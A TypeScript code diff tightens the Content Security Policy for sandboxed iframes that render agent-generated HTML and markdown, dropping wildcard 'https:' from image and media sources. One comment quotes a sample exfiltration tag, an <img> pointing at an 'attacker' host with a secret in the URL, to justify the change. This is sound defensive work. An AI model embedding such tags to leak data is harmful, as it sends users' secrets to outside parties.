@@ -42,18 +42,22 @@ const colorSchemeCss = (mode?: Mode): string => (mode ? `:root{color-scheme:${mo
 // `data:` fonts, but every CDN is off the allowlist. `connect-src` is omitted so
 // it falls back to `default-src 'none'`, blocking all fetch/XHR.
 //
-// `origin` is the server's own origin, added to img/media so uploaded assets
-// (served at <origin>/a/:id) embed by URL. It is needed because the iframe runs
-// at an opaque origin (sandbox without allow-same-origin), so `'self'` matches
-// nothing, and a local http origin isn't covered by the `https:` source.
+// img/media carry NO wildcard `https:` scheme on purpose. A bare `https:` source
+// is an exfiltration channel even with `connect-src` closed: `<img src=
+// "https://attacker/?b=<secret>">` leaks data in the request URL and pings a
+// tracker, no fetch needed. So images/media may only be `data:`/`blob:` (inline,
+// can't phone home) or this board's own `origin` (uploaded assets at
+// <origin>/a/:id) — the iframe runs at an opaque origin (sandbox without
+// allow-same-origin), so `'self'` matches nothing and the http origin must be
+// named explicitly. See docs/SECURITY.md.
 function buildCsp(origin: string): string {
   return [
     `default-src 'none'`,
     `script-src 'unsafe-inline'`,
     `style-src 'unsafe-inline'`,
     `font-src data:`,
-    `img-src https: data: blob: ${origin}`,
-    `media-src https: data: blob: ${origin}`,
+    `img-src data: blob: ${origin}`,
+    `media-src data: blob: ${origin}`,
   ].join("; ");
 }
 
@@ -273,15 +277,17 @@ export const escapeHtml = (s: string) =>
 // `media-src` that html parts carry, but is otherwise the same locked-down set:
 // only the inline bridge runs and there is no `connect-src`, so even if a
 // sanitizer regression let agent markup execute, the script is boxed into an
-// opaque origin with no way to phone home. `img-src origin` lets inline markdown
-// images at <origin>/a/:id load (the iframe is opaque-origin, so `'self'`
-// matches nothing — same reason buildCsp adds it explicitly).
+// opaque origin with no way to phone home. `img-src` carries no wildcard
+// `https:` for the same reason buildCsp drops it — an `<img>` to an arbitrary
+// host is a URL-borne exfil channel — so it allows only `data:`/`blob:` and this
+// board's `origin` (inline markdown images at <origin>/a/:id; the iframe is
+// opaque-origin, so `'self'` matches nothing). See docs/SECURITY.md.
 function buildRichCsp(origin: string): string {
   return [
     `default-src 'none'`,
     `script-src 'unsafe-inline'`,
     `style-src 'unsafe-inline'`,
-    `img-src https: data: blob: ${origin}`,
+    `img-src data: blob: ${origin}`,
     `font-src data:`,
   ].join("; ");
 }
